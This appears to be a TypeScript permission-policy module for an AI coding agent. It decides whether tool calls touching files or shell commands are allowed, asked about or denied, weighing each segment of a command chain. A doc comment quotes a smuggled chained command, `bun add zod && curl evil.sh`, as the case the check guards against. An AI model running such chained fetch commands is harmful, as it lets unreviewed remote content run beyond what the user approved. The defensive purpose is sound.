import path from 'node:path'

import type { PermissionAccess, PermissionRule } from 'shared'

import { isWithin } from '../../utils/paths'
import { parseCommand } from '../tools/shell/parse'
import {
  deniedPathArgumentReason,
  outsideProjectArgument,
} from './builtin/commandPaths'
import { dangerousCommandReason } from './builtin/dangerousCommands'
import { deniedPathReason } from './builtin/deniedPaths'
import { isKnownSafeCommand } from './builtin/safeCommands'
import type { ToolAccess } from './request/types'
import {
  commandExactRuleCovers,
  commandHeadRuleCovers,
  pathRuleCovers,
  ruleAppliesToTool,
} from './rules/match'

export type PolicyDecision = 'allow' | 'ask' | 'deny'

export type EvaluationContext = {
  tool: string
  projectDirectory: string
  rules: PermissionRule[]
}

/** What a command evaluation found that only a command has. */
export type CommandDetail = {
  /** The one command in the chain that settled the decision. */
  decidingSegment?: string[]
  /**
   * Every command in the chain, so a grant can be weighed against all of them
   * before it is offered. Empty when the command never got as far as parsing.
   */
  segments: string[][]
}

export type AccessVerdict = {
  decision: PolicyDecision
  /** Why the decision is not `allow`, in words the user can act on. */
  reason?: string
  /**
   * Whether the user may be offered anything more lasting than `allow once`.
   * A tool whose access cannot be described in a rule the next call would
   * match should say `false` and let the user decide each time.
   */
  mayBeRemembered: boolean
  command?: CommandDetail
}

type SegmentVerdict = {
  decision: PolicyDecision
  reason?: string
  mayBeRemembered: boolean
}

const SEVERITY: Record<PolicyDecision, number> = { allow: 0, ask: 1, deny: 2 }

export async function evaluateAccess(
  access: ToolAccess,
  context: EvaluationContext,
): Promise<AccessVerdict> {
  if (access.kind === 'command') {
    return evaluateCommand(access.command, context)
  }

  const decision = evaluatePath(access.path, access.access, context)
  return {
    decision,
    reason:
      decision === 'deny'
        ? (deniedPathReason(
            path.resolve(context.projectDirectory, access.path),
          ) ?? 'a permission rule denies it')
        : undefined,
    mayBeRemembered: true,
  }
}

/** The strictest verdict across everything one tool call would touch. */
export async function evaluateAccesses(
  accesses: ToolAccess[],
  context: EvaluationContext,
): Promise<AccessVerdict & { access?: ToolAccess }> {
  let worst: (AccessVerdict & { access?: ToolAccess }) | undefined

  for (const access of accesses) {
    const verdict = { ...(await evaluateAccess(access, context)), access }
    if (!worst || SEVERITY[verdict.decision] > SEVERITY[worst.decision]) {
      worst = verdict
    }
    if (worst.decision === 'deny') break
  }

  return worst ?? { decision: 'allow', mayBeRemembered: true }
}

/**
 * Kept synchronous: the filesystem guard consults it on every path a tool
 * opens, and unlike a command a path needs no parsing to be understood.
 */
export function evaluatePath(
  requestedPath: string,
  access: PermissionAccess,
  context: EvaluationContext,
): PolicyDecision {
  const absolute = path.resolve(context.projectDirectory, requestedPath)

  if (deniedPathReason(absolute)) return 'deny'

  const applicable = context.rules.filter((rule) =>
    ruleAppliesToTool(rule, context.tool),
  )

  if (
    applicable.some(
      (rule) =>
        rule.decision === 'deny' && pathRuleCovers(rule, absolute, access),
    )
  ) {
    return 'deny'
  }
  if (
    applicable.some(
      (rule) =>
        rule.decision === 'allow' && pathRuleCovers(rule, absolute, access),
    )
  ) {
    return 'allow'
  }

  return isWithin(context.projectDirectory, absolute) ? 'allow' : 'ask'
}

/**
 * Weighs a command line one shell command at a time, taking the strictest
 * answer across the chain, so a grant covering the first command never carries
 * whatever follows it.
 *
 * Anything the parser could not read plainly - a substitution, a redirection,
 * words that do not describe what will run - still gets asked about, but may
 * never be remembered. The same goes for a command on the dangerous list, so a
 * stored `git` rule cannot quietly grow to cover `git push --force`.
 */
export async function evaluateCommand(
  command: string,
  context: EvaluationContext,
): Promise<AccessVerdict> {
  const applicable = context.rules.filter((rule) =>
    ruleAppliesToTool(rule, context.tool),
  )

  if (
    applicable.some(
      (rule) =>
        rule.decision === 'deny' && commandExactRuleCovers(rule, command),
    )
  ) {
    return {
      decision: 'deny',
      reason: 'a permission rule denies this command',
      mayBeRemembered: false,
      command: { segments: [] },
    }
  }

  const parsed = await parseCommand(command)
  if (!parsed.ok) {
    return {
      decision: 'ask',
      reason: parsed.reason,
      mayBeRemembered: false,
      command: { segments: [] },
    }
  }

  const { segments, sawSubstitution, sawRedirection, tokensAreFaithful } =
    parsed.parsed

  const parseConcern = unreadableReason({
    sawSubstitution,
    sawRedirection,
    tokensAreFaithful,
  })

  const coveredExactly = applicable.some(
    (rule) =>
      rule.decision === 'allow' && commandExactRuleCovers(rule, command),
  )

  let decision: PolicyDecision = 'allow'
  let reason: string | undefined
  let decidingSegment: string[] | undefined
  let mayBeRemembered = parseConcern === undefined

  for (const segment of segments) {
    const verdict = evaluateSegment(
      segment,
      applicable,
      coveredExactly,
      context.projectDirectory,
    )
    mayBeRemembered = mayBeRemembered && verdict.mayBeRemembered

    if (SEVERITY[verdict.decision] > SEVERITY[decision]) {
      decision = verdict.decision
      reason = verdict.reason
      decidingSegment = segment
    }
    if (decision === 'deny') break
  }

  if (parseConcern !== undefined && decision !== 'deny') {
    decision = 'ask'
    reason = reason ?? parseConcern
    decidingSegment = decidingSegment ?? segments[0]
  }

  return {
    decision,
    reason,
    mayBeRemembered,
    command: { decidingSegment, segments },
  }
}

/**
 * Whether recording this head would settle the whole command line and not just
 * the part it names. Without the check, approving `bun add` from a prompt
 * about `bun add zod && curl evil.sh` would run the curl too, under a rule
 * that never mentions it.
 *
 * No segments means the command never reached the parser, so there is nothing
 * to weigh the head against and it is not offered.
 */
export function headWouldAllowEverything(
  head: readonly string[],
  segments: readonly string[][],
  context: EvaluationContext,
): boolean {
  if (segments.length === 0) return false

  // Never stored: this stands in for the rule the user is about to be offered,
  // so the offer can be weighed before it is made.
  const candidate: PermissionRule = {
    id: 'perm_candidate',
    tool: context.tool,
    decision: 'allow',
    match: { kind: 'commandHead', tokens: [...head] },
    createdAt: new Date(0).toISOString(),
  }

  const applicable = [
    ...context.rules.filter((rule) => ruleAppliesToTool(rule, context.tool)),
    candidate,
  ]

  return segments.every(
    (segment) =>
      evaluateSegment(segment, applicable, false, context.projectDirectory)
        .decision === 'allow',
  )
}

function unreadableReason(flags: {
  sawSubstitution: boolean
  sawRedirection: boolean
  tokensAreFaithful: boolean
}): string | undefined {
  if (flags.sawSubstitution) {
    return 'it runs another command and uses its output, which cannot be checked ahead of time'
  }
  if (flags.sawRedirection) {
    return 'it redirects output, which can overwrite a file the command does not name'
  }
  if (!flags.tokensAreFaithful) {
    return 'its words do not describe what the shell would actually run'
  }
  return undefined
}

function evaluateSegment(
  segment: string[],
  applicable: PermissionRule[],
  coveredExactly: boolean,
  projectDirectory: string,
): SegmentVerdict {
  if (
    applicable.some(
      (rule) =>
        rule.decision === 'deny' && commandHeadRuleCovers(rule, segment),
    )
  ) {
    return {
      decision: 'deny',
      reason: 'a permission rule denies this command',
      mayBeRemembered: false,
    }
  }

  // Both of the next two are checked before any allow rule, so a broad grant
  // cannot reach past them.
  const deniedPath = deniedPathArgumentReason(segment, projectDirectory)
  if (deniedPath) {
    return { decision: 'deny', reason: deniedPath, mayBeRemembered: false }
  }

  const dangerous = dangerousCommandReason(segment)
  if (dangerous) {
    return { decision: 'ask', reason: dangerous, mayBeRemembered: false }
  }

  if (
    coveredExactly ||
    applicable.some(
      (rule) =>
        rule.decision === 'allow' && commandHeadRuleCovers(rule, segment),
    )
  ) {
    return { decision: 'allow', mayBeRemembered: true }
  }

  if (isKnownSafeCommand(segment)) {
    // The safe list is the policy's own guess that a command is harmless, and
    // that guess only holds inside the project: `cat` never writes anything,
    // but `cat ../other-project/notes.md` still reads a file the user was
    // never asked about. A rule naming the program is the user's own judgment
    // about it, and is left to stand above.
    const outside = outsideProjectArgument(segment, projectDirectory)
    if (outside === null) {
      return { decision: 'allow', mayBeRemembered: true }
    }

    return {
      decision: 'ask',
      reason: `it reads ${outside}, which is outside the project directory`,
      mayBeRemembered: true,
    }
  }

  return { decision: 'ask', mayBeRemembered: true }
}
